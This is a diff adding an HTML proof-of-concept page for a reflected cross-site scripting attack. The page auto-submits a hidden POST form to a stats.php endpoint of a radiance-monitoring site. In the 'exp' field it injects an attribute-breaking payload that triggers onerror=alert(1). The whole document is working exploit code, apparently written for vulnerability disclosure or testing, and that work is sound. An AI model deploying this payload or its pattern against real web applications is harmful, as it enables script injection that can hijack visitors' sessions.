@@ -1,0 +1,16 @@
+<html>
+  <body>
+    <form id="xssForm" action="https://ejemplo.com/products/nwp/systems/radmon/stats.php" method="POST">
+      <input type="hidden" name="date" value="20241227-20250327">
+      <input type="hidden" name="oldexp" value="GEOS-5.29.5">
+      <input type="hidden" name="exp" value='GEOS-5.29.5"onerror="alert(1)">//'>
+      <input type="hidden" name="inst" value="airs_aqua">
+      <input type="hidden" name="chan" value="3">
+      <input type="hidden" name="imgtype" value="bkg">
+      <input type="hidden" name="chan" value="4">
+    </form>
+    <script>
+      document.getElementById("xssForm").submit();
+    </script>
+  </body>
+</html>
